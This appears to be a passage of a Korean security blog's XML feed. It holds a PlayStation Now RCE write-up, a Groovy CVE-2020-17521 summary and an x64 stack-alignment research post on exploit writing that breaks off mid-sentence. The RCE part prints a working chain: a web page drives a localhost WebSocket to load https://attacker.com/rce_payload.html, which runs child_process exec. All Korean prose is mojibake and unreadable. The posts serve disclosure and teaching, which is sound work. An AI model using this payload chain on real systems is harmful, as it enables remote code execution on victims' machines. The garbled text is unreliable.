ìˆìŠµë‹ˆë‹¤.<br><br><br>í”¼í•´ìì˜ ì»´í“¨í„°ì—ì„œ PS Nowì™€ QAS, ë¡œì»¬ ì›¹ ì†Œì¼“ì´ ì‹¤í–‰ ì¤‘ì¼ ê²½ìš° ì•„ë˜ì™€ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><ol><li><p>ë¸Œë¼ìš°ì €ë¡œ í•´ì»¤ì˜ ì›¹ì‚¬ì´íŠ¸ì— ì ‘ì†í•©ë‹ˆë‹¤.</p></li><li><p>ì›¹ ì‚¬ì´íŠ¸ëŠ” í”¼í•´ì PCì˜ ì›¹ ì†Œì¼“ ì„œë²„ <code>ws://localhost:1235</code> ì— ì—°ê²°ë©ë‹ˆë‹¤.</p></li><li><p>ì›¹ì‚¬ì´íŠ¸ëŠ” ì›¹ ì†Œì¼“ ì„œë²„ì— ë‹¤ìŒê³¼ ê°™ì€ ë©”ì‹œì§€ë¥¼ ë³´ëƒ…ë‹ˆë‹¤. </p> <pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;command&quot;</span>:<span class="hljs-string">&quot;setUrl&quot;</span>,<span class="hljs-attr">&quot;params&quot;</span>:&#123;<span class="hljs-attr">&quot;url&quot;</span>:<span class="hljs-string">&quot;https://attacker.com/rce_payload.html&quot;</span>&#125;,<span class="hljs-attr">&quot;source&quot;</span>:<span class="hljs-string">&quot;QAS&quot;</span>,<span class="hljs-attr">&quot;target&quot;</span>:<span class="hljs-string">&quot;AGL&quot;</span>&#125;</code></pre></li><li><p>AGLì€ <code>https://attacker.com/rce_payload.html</code> ë¥¼ ë¡œë“œí•©ë‹ˆë‹¤. ì´ë•Œ <code>rce_payload.html</code>ì˜ javascript ì½”ë“œê°€ í”¼í•´ìì˜ PCì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤.</p> <pre><code class="hljs jsx"><span class="hljs-comment">// rce_payload.html</span>&lt;html&gt;    &lt;head&gt;        &lt;title&gt;PS Now RCE&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)            .exec(<span class="hljs-string">&#x27;calc&#x27;</span>)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>playstation</tag>
      
      <tag>remote code execution</tag>
      
      <tag>playstation now</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-17521: Apache Groovy Information Disclosure</title>
    <link href="/2020/12/07/idioth/2020-12-07/"/>
    <url>/2020/12/07/idioth/2020-12-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2020/q4/183">https://seclists.org/oss-sec/2020/q4/183</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Unsupported Codehaus version of Groovy from 2.0 to 2.4.4.</li><li>Apache Groovy versions 2.4.4 to 2.4.20 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1.</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache Groovyì—ì„œ <code>createTempDir</code> methodë¡œ ì¸í•œ Local Privilege Escalationê³¼ Information Disclosureê°€ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ìœ ë‹‰ìŠ¤ ê¸°ë°˜ ìš´ì˜ ì²´ì œì™€ Mac OSX, Windowsì˜ ì˜›ë‚  ë²„ì „ì´ ì˜í–¥ì„ ë°›ìŠµë‹ˆë‹¤. ì·¨ì•½ì ì— ë…¸ì¶œë˜ëŠ” ì¡°ê±´ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ul><li>ì˜í–¥ì„ ë°›ëŠ” ìš´ì˜ ì²´ì œì—ì„œ Groovy codeê°€ ë™ì‘</li><li>ë‹¤ë¥¸ ìœ ì €ê°€ Groovy codeì— ì ‘ê·¼í•  ìˆ˜ ìˆìŒ</li><li><code>createTempDir</code> extension methodë¥¼ í†µí•´ ì„ì‹œ ë””ë ‰í„°ë¦¬ê°€ ìƒì„±</li></ul><p>GroovyëŠ” ëª¨ë“  ìœ ì €ê°€ ê³µìœ í•  ìˆ˜ ìˆëŠ” OS ì„ì‹œ ë””ë ‰í„°ë¦¬ ë‚´ì— ì„ì‹œ ë””ë ‰í„°ë¦¬ë¥¼ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. Groovyì—ì„œ <code>createTempDir</code> methodë¥¼ ì‚¬ìš©í•˜ë©´ java stubì„ ìƒì„±í•  ë•Œ ì‚¬ìš©ë˜ê±°ë‚˜ user codeë¥¼ ëŒ€ì‹ í•˜ê¸° ìœ„í•œ ì„ì‹œ ë””ë ‰í„°ë¦¬ê°€ ìƒì„±ë©ë‹ˆë‹¤. Groovy user codeê°€ <code>createTempDir</code> methodë¥¼ ì‚¬ìš©í•˜ì—¬ ì„ì‹œ ë””ë ‰í„°ë¦¬ì— ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì½”ë“œë¥¼ ì €ì¥í•˜ë©´ Local Privilege Escalationì´ ê°€ëŠ¥í•˜ê³  ë¯¼ê°í•œ ì •ë³´ë¥¼ ì €ì¥í•˜ê¸° ìœ„í•´ ì„ì‹œ ë””ë ‰í„°ë¦¬ê°€ ì‚¬ìš©ëœë‹¤ë©´ ì •ë³´ê°€ ë…¸ì¶œë˜ê±°ë‚˜ ìˆ˜ì •ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì´ ìˆ˜ì •ëœ Groovy 2.5 ì´ìƒ ë²„ì „ê³¼ JDK 7 ì´ìƒì—ì„œ ì‹¤í–‰ë˜ëŠ” Groovy 2.4ì—ì„œëŠ” Groovy Codeë¥¼ ì‹¤í–‰í•˜ëŠ” ì‚¬ìš©ìë§Œ ì½ì„ ìˆ˜ ìˆëŠ” ë””ë ‰í„°ë¦¬ë¥¼ ìƒì„±í•˜ëŠ” ìƒˆë¡œìš´ JDK methodë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ ì´ ë°©ë²•ì€ Local Privilege Escalationì€ ë§‰ì„ ìˆ˜ ìˆì§€ë§Œ Information DisclosureëŠ” ë§‰ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.</p><p>ì‹œìŠ¤í…œ í™˜ê²½ ë³€ìˆ˜ <code>java.io.tmpdir</code>ë¥¼ ì‹¤í–‰ ì¤‘ì¸ ì‚¬ìš©ìì˜ ê³ ìœ  ë””ë ‰í„°ë¦¬ë¡œ ì„¤ì •í•˜ë©´ ëª¨ë“  ìš´ì˜ ì²´ì œì™€ Groovy ë²„ì „ì—ì„œ ì·¨ì•½ì ì´ í•´ê²°ë©ë‹ˆë‹¤. í˜¹ì€ Groovy extension method ëŒ€ì‹  JDKì˜ <code>Files#createTempDirectory</code> methodë¥¼ ì‚¬ìš©í•˜ì—¬ ì·¨ì•½ì ì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>information disclosure</tag>
      
      <tag>apache</tag>
      
      <tag>idioth</tag>
      
      <tag>groovy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] x64 stack alignment</title>
    <link href="/2020/12/06/fabu1ous/x64-stack-alignment/"/>
    <url>/2020/12/06/fabu1ous/x64-stack-alignment/</url>
    
    <content type="html"><![CDATA[<h1 id="ë¨¸ë¦¿ë§"><a href="#ë¨¸ë¦¿ë§" class="headerlink" title="ë¨¸ë¦¿ë§"></a>ë¨¸ë¦¿ë§</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/1.png"></p><p>ë¹„ë°€ í”„ë¡œì íŠ¸( ì•„ì§ ë¹„ë°€, ì‰¿! ) ë•Œë¬¸ì— Ubuntu 20.04ì—ì„œ ëª‡ ê°€ì§€ í…ŒìŠ¤íŠ¸ë¥¼ í•˜ë‹¤ê°€ ì²˜ìŒ ë³´ëŠ” ì—ëŸ¬ì— ë‹¹í™©í–ˆìŠµë‹ˆë‹¤. <code>do_system+364: movaps</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì—ì„œ Segmentation Faultê°€ ë°œìƒí•˜ë”ë¼ê³ ìš”.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/2.png"></p><p>ì•Œì•„ë³´ë‹ˆê¹Œ Ubuntu 18.04ë¶€í„° <code>do_system()</code>ì— <code>movaps</code>ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ í•˜ë‚˜ ì¶”ê°€ëìŠµë‹ˆë‹¤. ì¡°ê¸ˆ ë’¤ì— ìì„¸íˆ ì„¤ëª…í•˜ê² ì§€ë§Œ, x64 ë¦¬ëˆ…ìŠ¤ì—ì„  16ë°”ì´íŠ¸ë¡œ stack alignmentë¥¼ ì§€ì¼œì•¼ í•©ë‹ˆë‹¤. stack alignmentê°€ ê¹¨ì ¸ìˆìœ¼ë©´ ì´ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‹¤í–‰í•˜ë‹¤ Segmentation Faultê°€ ëœ¹ë‹ˆë‹¤.</p><p>ì´ë†ˆ ë•Œë¬¸ì— 18.04 ì´ì „ ë²„ì „ì—ì„œ ìµìŠ¤ ë˜ëŠ” BOF ê³µê²©ì½”ë“œê°€ 18.04 ì´í›„ ë²„ì „ì—ì„œëŠ” ì‚¬ìš©í•  ìˆ˜ ì—†ëŠ” ê²½ìš°ë„ ìˆë‹¤ê³  í•©ë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/3.png"></p><p><em>æ•… Fabu1ousì˜ ë„¤ì´ë²„ ë¸”ë¡œê·¸ (2018.10 ~ 2019.12)</em></p><p>ì§€ê¸ˆê¹Œì§€ í‘¼ í¬ë„ˆë¸” ë¬¸ì œë§Œ ë°±ëª‡ ê°œì¯¤ ë˜ê³  ìˆ˜ì—†ì´ ë§ì€ <code>system(&quot;/bin/sh&quot;)</code>ì„ í˜¸ì¶œí•´ ë´¤ëŠ”ë° ì–´ì§¸ì„œ ì´ ì‚¬ì‹¤ì„ ì´ì œì•¼ ì•Œê²Œ ëœ ê±°ì§€?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/4.png"></p><p>ì‘ë…„(2019) í¬ë¦¬ìŠ¤ë§ˆìŠ¤ CTFì—ì„œ ë‹¨ìˆœ ROPë¬¸ì œë¥¼ ìµìŠ¤ ëª»í•´ì„œ í™”ë‚¬ë˜ ê¸°ì–µì´ ë¨¸ë¦¬ë¥¼ ìŠ¤ì¹˜ê³  ì§€ë‚˜ê°”ìŠµë‹ˆë‹¤. ë¶„ëª… ë¡œì»¬ì—ì„  ìµìŠ¤ê°€ ë˜ë˜ ê²Œ ë¦¬ëª¨íŠ¸ ìµìŠ¤ê°€ ì•ˆë¼ì„œ íŒ€ì›ì—ê²Œ ì½”ë“œë¥¼ ë„˜ê²¨ì£¼ê³  ë‹¤ë¥¸ ë¬¸ì œ ë³´ëŸ¬ ê°”ì—ˆì£ . ê·¸ë•Œ ëª» í’€ì—ˆë˜ ROPë¬¸ì œëŠ” solo_testë€ ë¬¸ì œì˜€ëŠ”ë° ê·¸ë•Œ ë¡œì»¬ í™˜ê²½ì´ ìš°ë¶„íˆ¬ 16.04ì˜€ìŠµë‹ˆë‹¤â€¦ í›„â€¦</p><p>ëŒ€íšŒ ëë‚˜ê³  ë°”ë¡œ ë©°ì¹  ë’¤ì— ì´ ì£¼ì œì— ëŒ€í•œ ë¼ì—…ì´ í•˜ë‚˜ ì˜¬ë¼ì™”ëŠ”ë° 1ë…„ì´ ì§€ë‚œ ì§€ê¸ˆì—ì„œì•¼ ì°¾ì•„ë³¸ ì œ ìì‹ ì´ ë„ˆë¬´ ë°‰ë„¤ìš”. ROPë¬¸ì œë¼ê³  ëŒ€ìˆ˜ë¡­ì§€ ì•Šê²Œ ê·¸ëƒ¥ ë„˜ê²¨ë²„ë¦° ê²ƒì— ë°˜ì„±í•˜ë©° ì§€ê¸ˆì´ë¼ë„ ê³µë¶€í•´ë´…ì‹œë‹¤.</p><blockquote><p>ëŠ¦ì—ˆë‹¤ê³  ìƒê°í•  ë•Œê°€ ì§„ì§œ ë„ˆë¬´ ëŠ¦ì—ˆë‹¤ -ë°•ëª…ìˆ˜-</p></blockquote><h1 id="x64-Stack-Alignment"><a href="#x64-Stack-Alignment" class="headerlink" title="x64 Stack Alignment"></a>x64 Stack Alignment</h1><p>stack alignmentëŠ” stackì˜ topì´ 16ì˜ ë°°ìˆ˜ë¡œ ìœ ì§€ëœ ìƒíƒœë©° ë©”ëª¨ë¦¬ì˜ access cycleì„ ìµœì†Œí•œìœ¼ë¡œ ì¤„ì´ê¸° ìœ„í•´ ì‚¬ìš©í•©ë‹ˆë‹¤. ( CSë¥¼ ê³µë¶€í•˜ë‹¤ê°€ â€œì™œ?â€ë¼ëŠ” ì§ˆë¬¸ì„ ë˜ì§€ë©´ ì‹­ì¤‘íŒ”êµ¬ â€œíš¨ìœ¨â€ì´ë¼ëŠ” ëŒ€ë‹µì´ ëŒì•„ì˜´, ë” ìì„¸í•œ ê±´ ì§ì ‘ ì°¾ì•„ë³´ì‹œê¸¸ ) ê·¸ë¦¬ê³  ì´ stack alignmentë¥¼ ìœ ì§€í•˜ê¸° ìœ„í•´ RSPì˜ ìœ„ì¹˜ê°€ ì •í•´ì§€ëŠ” ê·œì¹™ì´ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/5.png"></p><p>Linux 64 <a href="https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf">ABI</a>( Application binary interface )ì— ë”°ë¥´ë©´ í”„ë¡œê·¸ë¨ì˜ íë¦„( control )ì´ í•¨ìˆ˜ì˜ entryë¡œ ì˜®ê²¨ì§€ëŠ” ì‹œì ì—ì„  ìŠ¤íƒ í¬ì¸í„°(rsp)+8ì´ í•­ìƒ 16ì˜ ë°°ìˆ˜ì—¬ì•¼ í•©ë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/6.png"></p><p>ë°©ê¸ˆ ì „ì—” RSPë¥¼ 16ì˜ ë°°ìˆ˜ë¡œ ìœ ì§€í•˜ëŠ” ê²Œ stack alignmentë¼ í•´ë†“ê³  ê°‘ìê¸° RSP+8ì´ 16ì˜ ë°°ìˆ˜ë¼ë‹ˆ, ë­ë¼ëŠ” ê±°ì•¼?</p><p>ë¬´ìŠ¨ ì†Œë¦°ì§€ ëª¨ë¥´ê² ì£ ? ì„¤ëª…ì´ ë­ ê°™ì´ ì“°ì—¬ìˆì–´ì„œ ê·¸ë ‡ì§€ ì‚¬ì‹¤ ì•„ì£¼ ê°„ë‹¨í•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-comment">// test.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello stack alignment\\n&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;hello();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><pre><code class="hljs bash">$ gcc -o <span class="hljs-built_in">test</span> test.c -no-pie$ gdb -q <span class="hljs-built_in">test</span></code></pre><p>ê°„ë‹¨í•œ ì˜ˆì œë¥¼ í†µí•´ í™•ì¸í•´ë´…ì‹œë‹¤. ë””ë²„ê¹…í•  ë•Œ ê±°ìŠ¬ë¦¬ë‹ˆ PIEëŠ” í•´ì œí•˜ê³  ì»´íŒŒì¼í•˜ì„¸ìš”. ì €ëŠ” Ubuntu 20.04ì™€ glibc-2.31ë¥¼ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/7.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/8.png"></p><pre><code class="hljs bash">pwndbg&gt; r</code></pre><p>ì •ìƒì ìœ¼ë¡œ í˜¸ì¶œëœ <code>main()</code> í•¨ìˆ˜ì˜ entry pointì…ë‹ˆë‹¤. ì•„ì§ í”„ë¡¤ë¡œê·¸ë¥¼ ì‹¤í–‰í•˜ê¸° ì „ì´ë‹ˆ RSP+8ì€ 16ì˜ ë°°ìˆ˜ê² ì£ ?</p><p>RSP : <code>0x7fffffffe038</code></p><p>RSP+8 : <code>0x7fffffffe040</code></p><p>ìœ„ ìŠ¤í¬ë¦°ìƒ·ì„ ë³´ë©´ RSP+8ì€ <code>0x7fffffffe040</code>ì´ë¯€ë¡œ 16ì˜ ë°°ìˆ˜ê°€ ë§ìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/9.png"></p><p>ê·¸ëŸ¼ ë‹¤ë“¤ ì•Œë‹¤ì‹œí”¼ call ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ stackì— return addressë¥¼ push í•˜ë‹ˆê¹Œ call ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‹¤í–‰í•˜ê¸° ì§ì „ì—” RSPê°€ 16ì˜ ë°°ìˆ˜ê² ì£ ?</p><p>RSP : <code>0x7fffffffe030</code></p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/10.png"></p><p>ê·¸ë¦¬ê³  í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸ì—ì„œ <code>push rbp</code>ë¥¼ í•˜ë‹ˆê¹Œ rbpëŠ” í•­ìƒ 16ì˜ ë°°ìˆ˜ê² ë„¤ìš”?</p><p>RSP : <code>0x7ffffffffdfe0</code></p><p>ëŒ€ì¶© ì •ë¦¬í•´ë³´ë©´ stack alignì„ ì§€í‚¤ë©´ì„œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” íë¦„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>call ì‹¤í–‰ ì§ì „ RSPëŠ” 16ì˜ ë°°ìˆ˜ ( stack align O )</li><li>í•¨ìˆ˜ì˜ entry pointì—ì„  RSP+8ì´ 16ì˜ ë°°ìˆ˜ ( stack align X )</li><li>í•¨ìˆ˜ì˜ í”„ë¡¤ë¡œê·¸ ì‹¤í–‰ í›„ RSPëŠ” 16ì˜ ë°°ìˆ˜ ( stack align O )</li><li>RBPëŠ” í•­ìƒ 16ì˜ ë°°ìˆ˜ ( stack align O )</li></ol><p>ì‚¬ì‹¤, í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë•Œ 2ë²ˆ ê³¼ì •ì—ì„œ ì ì‹œ stack alignì´ ê¹¨ì§€ê³  3ë²ˆì—ì„œ ë‹¤ì‹œ stack alignì´ ë§ì¶°ì§‘ë‹ˆë‹¤. ì—¬ê¸°ì„œ 2ë²ˆë§Œ ë˜‘ ë–¼ì„œ â€œì´ ê²ƒë§Œ ì§€í‚¤ì‹œë©´ stack alignì…ë‹ˆë‹¤.â€ë¼ê³  ì„¤ëª…ì„ ì¨ë†”ì„œ í—·ê°ˆë¦¬ëŠ” ê²ë‹ˆë‹¤. ì´ë˜ë„ ì´í•´ ì•ˆ ë˜ì‹œë©´ 4ë²ˆë§Œ ê¸°ì–µí•˜ì„¸ìš”. 4ë²ˆë§Œ ì‹ ê²½ ì¨ì¤˜ë„ ê³µê²© ì½”ë“œë¥¼ ì§œëŠ”ë° ì•„ë¬´ ì§€ì¥ì´ ì—†ì„ ê²ë‹ˆë‹¤. ë” ìì„¸í•œ ì„¤ëª…ì€ ì¡°ê¸ˆ ì´ë”° í•˜ê² ìŠµë‹ˆë‹¤.</p><h1 id="MOVAPS"><a href="#MOVAPS" class="headerlink" title="MOVAPS"></a>MOVAPS</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/11.png"></p><p>ì´ ê·œì¹™ì„ ê¼­ ì§€ì¼œì•¼ í•˜ëŠ”ê°€? ë¬¼ë¡  ì•„ë‹™ë‹ˆë‹¤. ë°©ê¸ˆ ì „ì—ë„ ì„¤ëª…í–ˆë“¯ì´ ìœ ì—°í•˜ê²Œ ì–´ê²¼ë‹¤ê°€ ì§€ì¼°ë‹¤ê°€ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  stack alignmentëŠ” íš¨ìœ¨ì„ ë†’ì´ê¸° ìœ„í•´ ìœ ì§€í•œë‹¤ê³ ë„ ì„¤ëª…í–ˆë‹¤ì‹œí”¼ ì§€í‚¤ì§€ ì•Šì•„ë„ í”„ë¡œê·¸ë¨ì´ ë™ì‘í•˜ëŠ”ë° ì•„ë¬´ ë¬¸ì œì—†ìŠµë‹ˆë‹¤. ë‹¤ë§Œ íš¨ìœ¨ì´ ì¢€ ë–¨ì–´ì§ˆ ë¿â€¦ ë¬¼ë¡  ì˜ˆì™¸ê°€ ì¡´ì¬í•˜ëŠ”ë° ëª‡ëª‡ intel/AMD cpuì—ì„œ SSE instructionì„ ì‹¤í–‰í•  ë•Œ  stack alignmentê°€ ê¹¨ì ¸ìˆìœ¼ë©´ segmentation faultê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/12.png"></p><p>ê·¸ë¦¬ê³  <a href="http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm">MOVAPS</a>ê°€ ë°”ë¡œ SSE intruction ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. XMM ë ˆì§€ìŠ¤í„°ë¼ë¦¬ í˜¹ì€ XMM ë ˆì§€ìŠ¤í„°ì™€ ë©”ëª¨ë¦¬ ì‚¬ì´ì—ì„œ double quadword( 16byte ) í¬ê¸°ì˜ ë°ì´í„°ë¥¼ ì˜®ê¸°ëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì¸ë°, ë©”ëª¨ë¦¬ì˜ align ì—¬ë¶€ë¥¼ ê°•ì œí•©ë‹ˆë‹¤.</p><pre><code class="hljs c">&lt;do_system+<span class="hljs-number">364</span>&gt; movaps xmmword ptr [rsp + <span class="hljs-number">0x50</span>], xmm0</code></pre><p>XMM ë ˆì§€ìŠ¤í„°ì™€ ë©”ëª¨ë¦¬ ì‚¬ì´ì—ì„œ ë°ì´í„°ë¥¼ ì˜®ê¸¸ ë•Œ, ë©”ëª¨ë¦¬ì˜ alignì´ ê¹¨ì ¸ìˆìœ¼ë©´ general protection( #GP / SIGSEGV ) faultë¥¼ ë°œìƒì‹œí‚µë‹ˆë‹¤. ê·¸ë¦¬ê³  Ubuntu 18.04ë¶€í„° ì´ movaps ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ <code>do_system()</code>ì„ í¬í•¨í•œ ì—¬ëŸ¬ ë©€í‹°ë¯¸ë””ì–´ ì˜¤í¼ë ˆì´ì…˜ì— ì¶”ê°€ë˜ì–´ exploitì„ ì‘ì„±í•  ë•Œ stack alignmentë¥¼ ì‹ ê²½ ì¨ì•¼ í•©ë‹ˆë‹¤.</p><h1 id="JMP-vs-CALL-vs-RET"><a href="#JMP-vs-CALL-vs-RET" class="headerlink" title="JMP vs CALL vs RET"></a>JMP vs CALL vs RET</h1><p>ê·¸ë˜ì„œ Exploitì´ë‘ stack alignì´ ê¹¨ì§€ëŠ” ê±°ë‘ ë¬´ìŠ¨ ìƒê´€ì¸ë°? ê·¸ë˜ì„œ ì™œ 16.04ì—ì„  ì‰˜ì„ ë„ìš°ë˜ ê³µê²© ì½”ë“œê°€ 18.04ë¶€í„´ ì‘ë™ ì•ˆ í•˜ëŠ” ê±´ë°? ì´ê±°ë¥¼ ì´í•´í•˜ë ¤ë©´ ìš°ì„  control intsructionë“¤ì˜ ì°¨ì´ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ìƒê°ë³´ë‹¤ ëª¨ë¥´ëŠ” ì‚¬ëŒì´ ë§ë”ë¼ê³ â€¦ ê° ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë§ˆë‹¤ ìŠ¤íƒì˜ ë³€í™”, ë” ìì„¸íˆ ë§í•˜ìë©´ RSPì˜ ë³€í™”ê°€ ì–´ë–¤ì§€ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤.</p><h2 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h2><blockquote><p>Transfers program control to a different point in the instruction stream <strong>without</strong> recording <strong>return information</strong>.</p></blockquote><p>ë‹¨ìˆœíˆ í”„ë¡œê·¸ë¨ì˜ íë¦„ì„ ì˜®ê¹€. ì¸ìš©êµ¬ë¥¼ ë³´ë©´ ì•Œê² ì§€ë§Œ ë¦¬í„´ ì •ë³´ë¥¼ ì €ì¥í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. jmp ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ ì¸í•œ ìŠ¤íƒì˜ ë³€í™”ëŠ” ì—†ë‹¤ê³  ìƒê°í•˜ì‹œë©´ ë©ë‹ˆë‹¤.</p><h2 id="2-CALL"><a href="#2-CALL" class="headerlink" title="2. CALL"></a>2. CALL</h2><p>ë°˜ë©´ call ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ í”„ë¡œê·¸ë¨ì˜ íë¦„ì„ ì˜®ê¸°ëŠ” ê²ƒì´ ì•„ë‹ˆë¼ subroutineì— ì ì‹œ ë“¤ë €ë‹¤ê°€ ëŒì•„ì˜¤ëŠ” ê²ƒì´ê¸° ë•Œë¬¸ì— ë¦¬í„´ ì •ë³´ë¥¼ ì €ì¥í•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  ê·¸ ë¦¬í„´ ì •ë³´ëŠ” stackì— push í•˜ê¸° ë•Œë¬¸ì— call ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‹¤í–‰í•œ ë’¤ì—” RSPì˜ ê°’ì´ 8ë§Œí¼ ê°ì†Œí•©ë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/13.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>call hello ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ì‹¤í–‰ë˜ë©´ &lt;main+18&gt;ì„ stackì— push í•˜ê² ì£ ?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/14.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>ë”°ë¼ì„œ ì •ìƒì ìœ¼ë¡œ í˜¸ì¶œëœ í•¨ìˆ˜ì˜ entry pointì—ì„  RSP+8ì´ 16ì˜ ë°°ìˆ˜ê°€ ë˜ëŠ” ê²ë‹ˆë‹¤. ì—¬ê¸°ì„œ ê¼­ ê¸°ì–µí•˜ì…”ì•¼ í•  ê²ƒì´ Callì„ ì‹¤í–‰í•œ ì§í›„ì—” ì¼ì‹œì ìœ¼ë¡œ stack alignì´ ê¹¨ì§„ë‹¤ëŠ” ê²ë‹ˆë‹¤.</p><h2 id="3-RET"><a href="#3-RET" class="headerlink" title="3. RET"></a>3. RET</h2><pre><code class="hljs c">pop ripjmp rip</code></pre><p>callì„ ì„¤ëª…í•  ë•Œ sub routineì— ì ì‹œ ë“¤ë €ë‹¤ ëŒì•„ê°„ë‹¤ê³  í–ˆìŠµë‹ˆë‹¤. ë¬¼ë¡  ì´ ëª¨ë“  ë™ì‘ì„ callì´ ë‹¤ í•˜ì§„ ì•Šê³ , ì›ë˜ì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ìŠ¤íŠ¸ë¦¼ìœ¼ë¡œ ë‹¤ì‹œ ëŒì•„ê°€ëŠ” ë™ì‘ì€  retì´ ëŒ€ì‹ í•´ì¤ë‹ˆë‹¤.</p><p>retì€ ë‘ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ í•˜ë‚˜ë¡œ í•©ì³ ë†¨ë‹¤ê³  ìƒê°í•˜ì‹œë©´ ë˜ëŠ”ë°, callì´ ì €ì¥í•´ë†“ì€ ë¦¬í„´ ì •ë³´ë¥¼ ìŠ¤íƒì—ì„œ ë¹¼ë‚´ì–´ jmp í•©ë‹ˆë‹¤. ì¦‰, RSPê°’ì´ 8ë§Œí¼ ì¦ê°€í•œë‹¤ëŠ” ëœ»ì…ë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/15.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>ìœ„ ìŠ¤í¬ë¦°ìƒ·ì€ retì„ ì‹¤í–‰í•˜ê¸° ì§ì „ì˜ ìƒí™©ì…ë‹ˆë‹¤. RSP ê°’ì„ 